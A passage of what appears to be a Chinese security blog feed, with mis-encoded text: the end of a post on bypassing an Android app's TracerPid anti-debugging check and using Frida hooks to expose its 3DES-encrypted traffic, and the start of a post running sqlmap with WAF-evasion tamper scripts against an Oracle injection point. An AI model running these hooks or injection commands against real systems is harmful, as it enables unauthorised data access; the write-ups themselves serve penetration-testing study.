æ‹·è´è¿›æ‰‹æœºä¸Šï¼Œè¿™ä¸€ç‚¹éå¸¸é‡è¦</strong>ï¼Œå› ä¸ºå¦‚æœä½ æ²¡æœ‰æŠŠç³»ç»ŸåŸå…ˆçš„ boot.img æ–‡ä»¶ä¿å­˜ä¸‹æ¥ï¼Œå½“æ–°çš„ boot.img æ–‡ä»¶å­˜åœ¨é—®é¢˜å¯èƒ½å¯¼è‡´æ— æ³•è¿›å…¥ç³»ç»Ÿï¼Œé‚£æ‰‹æœºè®¾å¤‡å°±å¤„äºä¸€ä¸ªå±é™©çš„å¤„å¢ƒï¼Œè¿™æ—¶è‹¥ä¿å­˜äº†æ—§çš„ boot.img æ–‡ä»¶æ—¶ï¼Œç›´æ¥åˆ·å›å»å°±å¯ä»¥æ¢å¤åŸå…ˆçš„ç³»ç»Ÿã€‚è¿™è¾¹åˆ©ç”¨ç¬¬ä¸‰æ–¹çš„  recovery é‡æ–°è¾“å…¥ boot.imgï¼ˆåˆ·å…¥recoveryè¯·çœ‹æ–‡æœ«ï¼‰ã€‚</p><p>1ï¼‰å°†æ–°æ—§çš„ boot.img æ”¾ç½®åœ¨æ‰‹æœºè®¾å¤‡ä¸Šçš„åŒä¸€ç›®å½•ä¸‹ï¼Œæ­¤å¤„ boot_new.img å³ä¸Šæ–‡ä¸­ boot.img.signed æ–‡ä»¶ï¼Œä¿®æ”¹åå­—å³å¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/38.png" data-caption="38"><img src="/../images/app/TracerPID/38.png" alt="38"></a></p><p>2ï¼‰æ‰‹æœºè¿›è¡Œ recovery æ¨¡å¼ï¼Œé€‰æ‹© boot_new.img åˆ·å…¥æ–°çš„ç³»ç»Ÿé•œåƒæ–‡ä»¶ï¼Œåˆ·å…¥åé‡å¯æ‰‹æœºå³å¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/39.jpg" data-caption="39"><img src="/../images/app/TracerPID/39.jpg" alt="39"></a></p><h2 id="å››ã€Hook-åˆ†æ"><a href="#å››ã€Hook-åˆ†æ" class="headerlink" title="å››ã€Hook åˆ†æ"></a>å››ã€Hook åˆ†æ</h2><p>é€šè¿‡ä¸Šé¢çš„ä¿®æ”¹ç³»ç»Ÿå†…æ ¸å®ç°äº†ç»•è¿‡ TracerPid æ£€æµ‹ï¼Œç°åœ¨é‡æ–°åˆ©ç”¨ frdia Hook åŠ å¯†å‡½æ•°ã€‚</p><div class="highlight-wrap" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> xxxDES3Util = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;cn.xxxx.encryption.xxxDES3Util&quot;</span>);</span><br><span class="line">    xxxDES3Util[<span class="string">&quot;encode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode is called: str=<span class="subst">$&#123;str&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;encode&quot;</span>](str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>æˆåŠŸè¿›è¡Œ hook ç¨‹åºæ— é—ªé€€ï¼Œhook ç»“æœå¦‚ä¸‹ï¼ŒåŠ å¯†å‰å’ŒåŠ å¯†åçš„ç»“æœå‡å·²æ˜¾ç¤ºå‡ºæ¥ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -UF -l test.js</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/40.png" data-caption="40"><img src="/../images/app/TracerPID/40.png" alt="40"></a></p><p>é€šè¿‡å¯¹æ¯”æŠ“åŒ…è½¯ä»¶æ•°æ®åŒ…ï¼Œå¯çŸ¥è¾“å‡ºä¸­çš„åŠ å¯†ç»“æœä¸æŠ“åŒ…çš„åŠ å¯†æ•°æ®ç»“æœä¸€è‡´ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/41.png" data-caption="41"><img src="/../images/app/TracerPID/41.png" alt="41"></a></p><p>æ ¹æ®ä¸Šå›¾ hook ç»“æœå¯çŸ¥ï¼ŒæœªåŠ å¯†çš„æ•°æ®ä¸ºã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/42.png" data-caption="42"><img src="/../images/app/TracerPID/42.png" alt="42"></a></p><p>ç›´æ¥å°†æœªåŠ å¯†çš„åŒ…æ”¾åˆ°æŠ“åŒ…è½¯ä»¶é‡æ”¾ï¼Œå¯ç»•è¿‡åŠ å¯†æœºåˆ¶ï¼Œè¾“å‡ºç»“æœäº¦ä¸ºæœªåŠ å¯†çš„ç»“æœï¼Œåç»­çš„åŠŸèƒ½æµ‹è¯•ä¹Ÿèƒ½åˆ©ç”¨è¯¥æ–¹æ³•è¿›è¡Œæµ‹è¯•ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/43.png" data-caption="43"><img src="/../images/app/TracerPID/43.png" alt="43"></a></p><p>æ ¹æ®ä¸Šé¢çš„ä»£ç ï¼Œè·Ÿè¿›åŠ å¯†ç®—æ³•ï¼ŒæŸ¥çœ‹å…·ä½“çš„åŠ å¯†ç®—æ³•å¦‚ä½•ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/44.png" data-caption="44"><img src="/../images/app/TracerPID/44.png" alt="44"></a></p><p>åŠ å¯†ç®—æ³•ä½¿ç”¨ 3DES  desede&#x2F;CBC&#x2F;OKCS5Padding æ¨¡å¼ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/45.png" data-caption="45"><img src="/../images/app/TracerPID/45.png" alt="45"></a></p><p>ç»§ç»­åˆ©ç”¨ Jadx hook  encode() å’Œ decode() æŸ¥çœ‹å…·ä½“è¾“å‡ºæƒ…å†µã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -UF -l test.js</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> xxxDES3Util = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;cn.xxxx.encryption.xxxDES3Util&quot;</span>);</span><br><span class="line">    xxxDES3Util[<span class="string">&quot;encode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode is called: str=<span class="subst">$&#123;str&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;encode&quot;</span>](str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    xxxDES3Util[<span class="string">&quot;decode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.decode is called: str=<span class="subst">$&#123;str&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;decode&quot;</span>](str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.decode result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>éƒ¨åˆ†å¦‚ä¸‹ï¼Œæ•°æ®åŒ…çš„è¯·æ±‚åŠå“åº”çš„åŠ è§£å¯†å‡å¯æŸ¥çœ‹ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/46.png" data-caption="46"><img src="/../images/app/TracerPID/46.png" alt="46"></a></p><p>æ ¹æ®å·²çŸ¥çš„ä¿¡æ¯ï¼Œç¼–å†™ä¸€ä¸ªfrida rcp å®ç°åŒæ­¥è¾“å‡ºåŠ è§£å¯†æ•°æ®åŒ…ã€‚</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤„ç†RPCè°ƒç”¨çš„å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="comment"># å¦‚æœmessageçš„ç±»å‹æ˜¯&#x27;send&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="comment"># æ‰“å°messageçš„payloadå†…å®¹</span></span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># æ‰“å°æ•´ä¸ªmessage</span></span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨äº hook ç¼–ç å’Œè§£ç æ–¹æ³•çš„ JavaScript ä»£ç </span></span><br><span class="line">hook_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    // è·å–ç›®æ ‡ç±»&#x27;cn.xxxx.encryption.xxxDES3Util&#x27;</span></span><br><span class="line"><span class="string">    var xxxDES3Util = Java.use(&quot;cn.xxxx.encryption.xxxDES3Util&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // é‡å†™&#x27;encode&#x27;æ–¹æ³•çš„å®ç°</span></span><br><span class="line"><span class="string">    xxxDES3Util.encode.overload(&quot;java.lang.String&quot;).implementation = function (input) &#123;</span></span><br><span class="line"><span class="string">        // æ‰“å°æœªåŠ å¯†çš„è¯·æ±‚æ•°æ®åŒ…</span></span><br><span class="line"><span class="string">        console.log(&quot;**************************************************** è¯·æ±‚æ•°æ®åŒ… ****************************************************\n&quot;);</span></span><br><span class="line"><span class="string">        console.log(&quot;æœªåŠ å¯†è¯·æ±‚æ•°æ®åŒ…ï¼š&quot; + input);</span></span><br><span class="line"><span class="string">        // è°ƒç”¨åŸå§‹çš„&#x27;encode&#x27;æ–¹æ³•å¹¶è·å–åŠ å¯†åçš„è¾“å‡º</span></span><br><span class="line"><span class="string">        var output = this.encode(input);</span></span><br><span class="line"><span class="string">        // æ‰“å°åŠ å¯†åçš„è¯·æ±‚æ•°æ®åŒ…</span></span><br><span class="line"><span class="string">        console.log(&quot;åŠ å¯†åè¯·æ±‚æ•°æ®åŒ…: &quot; + output);</span></span><br><span class="line"><span class="string">        // è¿”å›åŠ å¯†åçš„æ•°æ®åŒ…</span></span><br><span class="line"><span class="string">        return output;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // é‡å†™&#x27;decode&#x27;æ–¹æ³•çš„å®ç°</span></span><br><span class="line"><span class="string">    xxxDES3Util.decode.overload(&quot;java.lang.String&quot;).implementation = function (input) &#123;</span></span><br><span class="line"><span class="string">        // æ‰“å°åŠ å¯†åçš„å“åº”æ•°æ®åŒ…</span></span><br><span class="line"><span class="string">        console.log(&quot;**************************************************** å“åº”æ•°æ®åŒ… ****************************************************\n&quot;);</span></span><br><span class="line"><span class="string">        console.log(&quot;åŠ å¯†åå“åº”æ•°æ®åŒ…: &quot; + input);</span></span><br><span class="line"><span class="string">        // è°ƒç”¨åŸå§‹çš„&#x27;decode&#x27;æ–¹æ³•å¹¶è·å–è§£å¯†åçš„è¾“å‡º</span></span><br><span class="line"><span class="string">        var output = this.decode(input);</span></span><br><span class="line"><span class="string">        // æ‰“å°è§£å¯†åçš„å“åº”æ•°æ®åŒ…</span></span><br><span class="line"><span class="string">        console.log(&quot;æœªåŠ å¯†å“åº”æ•°æ®åŒ…: &quot; + output);</span></span><br><span class="line"><span class="string">        // è¿”å›è§£å¯†åçš„æ•°æ®åŒ…</span></span><br><span class="line"><span class="string">        return output;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–USBè®¾å¤‡</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨å…¥ç›®æ ‡è¿›ç¨‹ï¼Œæ›¿æ¢ä¸ºç›®æ ‡è¿›ç¨‹çš„åç§°æˆ–åŒ…å</span></span><br><span class="line">pid = device.spawn([<span class="string">&quot;cn.xxx.xxxx&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line"><span class="comment"># ç­‰å¾…è¿›ç¨‹å¯åŠ¨</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># è¿æ¥åˆ°æŒ‡å®šè¿›ç¨‹</span></span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="comment"># ä½¿ç”¨ hook_script å­—ç¬¦ä¸²ä½œä¸ºè„šæœ¬å†…å®¹</span></span><br><span class="line">script = session.create_script(hook_script)</span><br><span class="line"><span class="comment"># å½“è„šæœ¬äº§ç”Ÿæ¶ˆæ¯æ—¶ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°è¿›è¡Œå¤„ç†</span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, on_message)</span><br><span class="line"><span class="comment"># è¿™å°†å¼€å§‹æ‰§è¡Œ hook æ“ä½œ</span></span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Frida hook RPC is running. Press Ctrl+C to exit.&quot;</span>)</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/47.png" data-caption="47"><img src="/../images/app/TracerPID/47.png" alt="47"></a></p><h2 id="äº”ã€æ‰©å±•"><a href="#äº”ã€æ‰©å±•" class="headerlink" title="äº”ã€æ‰©å±•"></a>äº”ã€æ‰©å±•</h2><h3 id="1ã€åˆ·å…¥-Recovery"><a href="#1ã€åˆ·å…¥-Recovery" class="headerlink" title="1ã€åˆ·å…¥ Recovery"></a>1ã€åˆ·å…¥ Recovery</h3><p>è¿™è¾¹åˆ©ç”¨åˆ©ç”¨ææœºåŠ©æ‰‹åˆ·å…¥ï¼Œå…·ä½“è¾“å…¥æ–¹å¼å„è‡ªå¯æ ¹æ®è‡ªèº«è®¾å¤‡é€‰æ‹©ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/48.png" data-caption="48"><img src="/../images/app/TracerPID/48.png" alt="48"></a></p><p>åœ¨åŠ©æ‰‹å¼•å¯¼æ¨¡å¼ä¸­é€‰æ‹©åˆ·å…¥RECï¼Œè‹¥åˆ·å…¥æˆåŠŸï¼Œç‚¹å‡»æ˜¯åæ‰‹æœºä¼šè‡ªåŠ¨è¿›å…¥ recovery æ¨¡å¼ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/49.png" data-caption="49"><img src="/../images/app/TracerPID/49.png" alt="49"></a></p><p>è¾“å…¥ä¸€ä¸ª password ï¼Œè¾“å…¥å¼€æœºå¯†ç å³å¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/50.jpg" data-caption="50"><img src="/../images/app/TracerPID/50.jpg" alt="50"></a></p><p>æ ¹æ®è‡ªå·±æ‰‹æœºé€‰æ‹©æ­£ç¡®çš„ twrp ï¼Œç¬”è€…ä½¿ç”¨çš„æ˜¯å°ç±³çš„ mix2s æ‰€ä»¥å¯¹åº”æ”¯æŒçš„ twrp ä¸‹è½½åœ°å€ä¸º<a href="https://twrp.me/xiaomi/xiaomimimix2s.html%EF%BC%8C%E5%85%B6%E5%AE%83%E6%9C%BA%E5%99%A8%E8%87%AA%E8%A1%8C%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81%E7%9A%84">https://twrp.me/xiaomi/xiaomimimix2s.htmlï¼Œå…¶å®ƒæœºå™¨è‡ªè¡ŒæŸ¥è¯¢æ”¯æŒçš„</a> twrpã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/51.png" data-caption="51"><img src="/../images/app/TracerPID/51.png" alt="51"></a></p><h2 id="å…­ã€æ€»ç»“"><a href="#å…­ã€æ€»ç»“" class="headerlink" title="å…­ã€æ€»ç»“"></a>å…­ã€æ€»ç»“</h2><p>æœ€åˆçš„é—®é¢˜æºè‡ªä¸€ä¸ªæŠ¥é”™ä¿¡æ¯ã€‚é€šè¿‡åˆ†æè¿™ä¸ªæŠ¥é”™ä¿¡æ¯,æˆ‘ä»¬å®šä½åˆ°äº†APPä¸­çš„åè°ƒè¯•æœºåˆ¶ã€‚è¿›ä¸€æ­¥æ·±å…¥äº†è§£äº†è¿™ç§åè°ƒè¯•æ‰‹æ®µçš„åŸç†åæ‰¾å¯»åˆé€‚çš„æ–¹æ³•æ¥ååè°ƒè¯•ï¼Œæœ€ç»ˆåˆæ­¥è§£å†³äº†APPåŠ å¯†æ•°æ®çš„é—®é¢˜ã€‚</p><h2 id="ä¸ƒã€å‚è€ƒé“¾æ¥"><a href="#ä¸ƒã€å‚è€ƒé“¾æ¥" class="headerlink" title="ä¸ƒã€å‚è€ƒé“¾æ¥"></a>ä¸ƒã€å‚è€ƒé“¾æ¥</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://zone.huoxian.cn/d/325-tracerpid</span><br><span class="line">https://www.sec4.fun/2021/04/16/bypassptrace/</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APPæµ‹è¯•ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APPæµ‹è¯• </tag>
            
            <tag> åˆ·æœº </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle æ³¨å…¥ä¹‹ SQLmap ç¨‹åºæŠ¥é”™è§£å†³</title>
      <link href="/2024/03/19/Oracle%20%E6%B3%A8%E5%85%A5%E4%B9%8B%20SQLmap%20%E7%A8%8B%E5%BA%8F%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"/>
      <url>/2024/03/19/Oracle%20%E6%B3%A8%E5%85%A5%E4%B9%8B%20SQLmap%20%E7%A8%8B%E5%BA%8F%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>æ–‡ç« å®é™…ä»·å€¼å¹¶ä¸é«˜ï¼Œæµ‹è¯•æ‰‹æ³•ä¹Ÿæ˜¯ç»å¸¸ä½¿ç”¨çš„æ‰‹æ³•ï¼Œå…¶ä¸»è¦æ˜¯ä¸ºäº†æé†’è‡ªå·±ï¼Œå½“åœ¨é‡åˆ°æ— æ³•è§£å†³çš„é—®é¢˜æ—¶ï¼Œå¤šå°è¯•å…¶å®ƒçš„æ€è·¯ï¼Œé‡åˆ°é—®é¢˜ï¼Œè§£å†³é—®é¢˜ï¼Œå¯¹ä»»ä½•äº‹ç‰©ä¿æŒå¼€é˜”çš„æ€è·¯ã€‚</p><h2 id="äºŒã€é—®é¢˜å‘ç°"><a href="#äºŒã€é—®é¢˜å‘ç°" class="headerlink" title="äºŒã€é—®é¢˜å‘ç°"></a>äºŒã€é—®é¢˜å‘ç°</h2><p>å‰æ®µæ—¶é—´åœ¨æµ‹è¯•ä¸­å‘ç°ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼Œè€é€‰æ‰‹å•å¼•å·æŠ¥é”™ï¼ŒåŒå•å¼•å·é—­åˆã€‚</p><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/sql-1.png" data-caption="sql-1"><img src="/../images/injection/oracle/sql-1.png" alt="sql-1"></a></p><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/sql-2.png" data-caption="sql-2"><img src="/../images/injection/oracle/sql-2.png" alt="sql-2"></a></p><h2 id="ä¸‰ã€æµ‹è¯•è¿‡ç¨‹"><a href="#ä¸‰ã€æµ‹è¯•è¿‡ç¨‹" class="headerlink" title="ä¸‰ã€æµ‹è¯•è¿‡ç¨‹"></a>ä¸‰ã€æµ‹è¯•è¿‡ç¨‹</h2><p>äºæ˜¯ä¹ sqlmap å¯åŠ¨ï¼Œå¯æƒœ Sqlmap æ™®é€šå‘½ä»¤è·‘æ— æ³•è·‘å‡ºæ•°æ®è¡¨ï¼Œå¾—çŸ¥æ•°æ®åº“ä¸º Oracleï¼ŒæŠ¥é”™ <code>unable to retrieve the database names</code> ï¼Œå‘½ä»¤å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --tamper space2morecomment, apostrophemask.py --level 5 --risk 3 --random-agent --threads=5 --tables</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/sql-3.png" data-caption="sql-3"><img src="/../images/injection/oracle/sql-3.png" alt="sql-3"></a></p><p>é‡åˆ°é—®é¢˜ï¼Œè§£å†³é—®é¢˜ï¼Œå¯åŠ¨ Google æœç´¢å¤§æ³• <code>unable to retrieve the database names</code>ï¼Œç»è¿‡ä¸€ç•ªæœå¯»ï¼Œå¤šæ¬¡å°è¯•ä¿®æ”¹ sqlmap å‘½ä»¤ï¼Œæœ€ç»ˆå°†å‘½ä»¤ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼Œä¹Ÿè®¸æœ‰äº›å‘½ä»¤æ˜¯å¤šä½™æ¯”å¦‚ space2morecomment ï¼Œå› ä¸ºç›®æ ‡ä¸º oracleï¼Œä½†ä¸å½±å“ä½¿ç”¨ï¼Œåœ¨å®é™…ä¸­äº¦æ²¡æœ‰åˆ æ‰ï¼Œæ•…è¿™é‡Œä¿ç•™ä¸€ä¸‹ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --tamper space2morecomment, apostrophemask.py,between.py,equaltolike.py --level 5 --risk 3 --random-agent --threads=5 --hex --tables --banner --dbms=oracle</span><br></pre></td></tr></table></figure></div><br/><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">--space2morecommentï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º/**_**/ </span><br><span class="line">--apostrophemask.pyï¼šå°† &#x27; æ›¿æ¢ä¸ºå…¶UTF-8å…¨è§’ç­‰ä»·å­—ç¬¦ %EF%BC%87</span><br><span class="line">--between.pyï¼šå°† betweenæ›¿æ¢å¤§äºå· &gt;</span><br><span class="line">--equaltolikeï¼šå°† like ä»£æ›¿ç­‰å·</span><br><span class="line">--level 5ï¼šè®¾ç½®æ³¨å…¥æµ‹è¯•çš„çº§åˆ«ä¸º5ï¼Œè¡¨ç¤ºä½¿ç”¨æœ€é«˜çº§åˆ«çš„æµ‹è¯•ã€‚</span><br><span class="line">--risk 3ï¼šè®¾ç½®æ³¨å…¥æµ‹è¯•çš„é£é™©ä¸º3ï¼Œè¡¨ç¤ºä½¿ç”¨æœ€é«˜é£é™©çš„æµ‹è¯•ã€‚</span><br><span class="line">--random-agentï¼šéšæœºé€‰æ‹©ä¸€ä¸ªç”¨æˆ·ä»£ç†æ ‡å¤´ï¼Œä»¥æ¨¡æ‹Ÿä¸åŒçš„æµè§ˆå™¨å’Œæ“ä½œç³»ç»Ÿã€‚</span><br><span class="line">--threads=5ï¼šæŒ‡å®šä½¿ç”¨5ä¸ªçº¿ç¨‹è¿›è¡Œæ³¨å…¥æµ‹è¯•ã€‚</span><br><span class="line">--hexï¼šä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç æ³¨å…¥æ•°æ®ã€‚</span><br><span class="line">--tablesï¼šè·å–æ•°æ®åº“ä¸­çš„è¡¨ä¿¡æ¯ã€‚</span><br><span class="line">--bannerï¼šæ˜¾ç¤ºç›®æ ‡æ•°æ®åº“çš„æ¨ªå¹…ä¿¡æ¯ã€‚</span><br><span class="line">--dbms=oracleï¼šæŒ‡å®šç›®æ ‡æ•°æ®åº“ç®¡ç†ç³»ç»Ÿä¸º Oracle</span><br></pre></td></tr></table></figure></div><blockquote><p>apostrophemask.py</p></blockquote><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/image-20240319162213334.png" data-caption="image-20240319162213334"><img src="/../images/injection/oracle/image-20240319162213334.png" alt="image-20240319162213334"></a></p><blockquote><p>between.py</p></blockquote><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/image-20240319162615060.png" data-caption="image-20240319162615060"><img src="/../images/injection/oracle/image-20240319162615060.png" alt="image-20240319162615060"></a></p><blockquote><p>equaltolike.py</p></blockquote><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/image-20240319162705626.png" data-caption="image-20240319162705626"><img src="/../images/injection/oracle/image-20240319162705626.png" alt="image-20240319162705626"></a></p><p>æœ€ç»ˆè·‘å‡ºæ•°æ®</p><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/image-20240319164556948.png" data-caption="image-20240319164556948"><img src="/../images/injection/oracle/image-20240319164556948.png" 